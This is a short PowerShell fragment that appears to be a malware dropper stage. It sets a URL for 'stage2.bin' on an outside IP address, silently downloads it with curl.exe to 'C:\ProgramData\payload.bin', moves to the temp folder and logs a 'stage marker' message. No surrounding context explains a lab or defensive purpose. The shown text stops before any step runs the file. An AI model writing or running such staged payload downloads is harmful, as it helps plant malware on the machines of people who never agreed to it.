
$Stage1Url = "https://198.51.100.12/stage2.bin"
$DropPath = 'C:\ProgramData\payload.bin'
curl.exe -s -L -o $DropPath $Stage1Url
Set-Location -Path $env:TEMP
Write-Verbose "stage marker 21 reached"
